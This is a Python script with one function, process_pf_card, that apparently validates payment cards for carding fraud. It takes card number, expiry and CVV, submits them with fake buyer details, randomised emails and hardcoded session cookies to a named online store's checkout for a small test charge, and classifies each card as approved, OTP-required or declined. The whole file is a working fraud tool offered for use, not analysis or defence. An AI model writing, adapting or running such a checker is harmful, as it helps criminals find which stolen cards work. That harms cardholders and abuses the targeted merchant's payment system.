import requests
import re
import random
import string
import json

def process_pf_card(cc):
    """
    Process credit card through Payflow gateway [0.98$]
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Payflow [0.98$]"
            }
        
        card_number, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if len(yy) == 2:
            yy = "20" + yy

        def generate_random_email():
            """Generate a random email address"""
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            return f"{username}@{domain}"

        def extract_error_message(response_text):
            """Extract error message from HTML response"""
            error_patterns = [
                r'<div class="ERRORS">(.*?)</div>',
                r'<div class="error">(.*?)</div>',
                r'<div class="alert alert-error">(.*?)</div>',
                r'class="error_message">(.*?)<',
                r'Error:(.*?)<',
                r'<p class="error">(.*?)</p>',
                r'<span class="error">(.*?)</span>'
            ]
            
            for pattern in error_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
                if match:
                    error_text = match.group(1).strip()
                    # Clean up HTML tags
                    error_text = re.sub(r'<[^>]*>', '', error_text)
                    return error_text
            
            # Check for success patterns
            success_patterns = [
                r'thank you',
                r'success',
                r'approved',
                r'payment complete',
                r'order confirmed'
            ]
            
            for pattern in success_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return "Payment Approved"
            
            return "No specific message found"

        # Common cookies and headers
        cookies = {
            "bid_48b113f42dc09a04ef102654144bd0f3": "84deb6a2a19a3574b34723efcf6bf817",
            "PHPSESSID": "92os74jahvh61pani4ri6i7j76",
            "cid_48b113f42dc09a04ef102654144bd0f3": "YoIFCQCEA2SASNgbAAka6w%3D%3D__5B0E6P48J8__6B5A2M8N5Z8E1B0N0C4N0Q4L0Q94G9",
        }
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        # Generate random email
        random_email = generate_random_email()
        
        # Prepare POST data for checkout
        checkout_headers = headers.copy()
        checkout_headers.update({
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://stores.modularmarket.com',
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
        })
        
        data = {
            # Shipping info
            'ship_sai[289]': '289',
            'ship_first_name[289]': 'John',
            'ship_last_name[289]': 'Doe',
            'ship_address_1[289]': '123 Main St',
            'ship_address_2[289]': '',
            'ship_city[289]': 'New York',
            'ship_state[289]': 'NY_US',
            'ship_zip[289]': '10001',
            'ship_country[289]': 'US',
            'submit_shipping_options[289_0o0_32]': '1756365496',
            'ship_method_selection[289_0o0]': 'shipoption_289_0o0_32_6',
            'submit_shipping_options[289_0o0_36]': '1756365496',
            'prechecked_ship_methods': 'shipoption_289_0o0_32_6',

            # Billing info
            'bill_first_name': 'John',
            'bill_last_name': 'Doe',
            'bill_address_1': '123 Main St',
            'bill_address_2': '',
            'bill_city': 'New York',
            'bill_state': 'NY_US',
            'bill_zip': '10001',
            'bill_country': 'US',
            'phone': '5551234567',
            'email': random_email,
            'email_confirm': random_email,

            # Payment info
            'slot_2': 'John Doe',
            'slot_1': card_number,
            'slot_3': mm,
            'slot_4': yy,
            'cc_security': cvv,
            'submit_pay_with_cc': 'Pay With Credit Card',
            'submit_paypal_wps_capture_order_checksum': '555d6702c950ecb729a966504af0a635',
            'nectar_decanter': '',
        }
        
        # Make the POST request to checkout
        response = requests.post(
            'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
            cookies=cookies,
            headers=checkout_headers,
            data=data,
            timeout=30
        )
        
        if response.status_code == 200:
            error_message = extract_error_message(response.text)
            response_lower = response.text.lower()
            error_lower = error_message.lower()
            
            # Determine status based on response content
            if any(pattern in response_lower for pattern in ['thank you', 'success', 'approved', 'payment complete', 'order confirmed' , 'successful' , 'successfully']):
                return {
                    "status": "APPROVED",
                    "response": "Payment Successfully",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['cvv', 'security code', 'verification']):
                return {
                    "status": "APPROVED_OTP",
                    "response": "CVV Required/OTP",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['insufficient', 'funds', 'low balance']):
                return {
                    "status": "APPROVED",
                    "response": "Insufficient Funds",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['declined', 'cannot be processed', 'invalid', 'failed']):
                return {
                    "status": "DECLINED",
                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Payment Declined",
                    "gateway": "Payflow [0.98$]"
                }
            elif 'do not honor' in error_lower:
                return {
                    "status": "DECLINED",
                    "response": "Do Not Honor",
                    "gateway": "Payflow [0.98$]"
                }
            else:
                # Default to declined if we can't determine the status
                return {
                    "status": "DECLINED",
                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Unknown response from gateway",
                    "gateway": "Payflow [0.98$]"
                }
        else:
            return {
                "status": "ERROR",
                "response": f"HTTP Error: {response.status_code}",
                "gateway": "Payflow [0.98$]"
            }
            
    except requests.Timeout:
        return {
            "status": "ERROR",
            "response": "Request timeout - Gateway not responding",
            "gateway": "Payflow [0.98$]"
        }
    except requests.ConnectionError:
        return {
            "status": "ERROR",
            "response": "Connection error - Check your internet",
            "gateway": "Payflow [0.98$]"
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing error: {str(e)}",
            "gateway": "Payflow [0.98$]"
        }

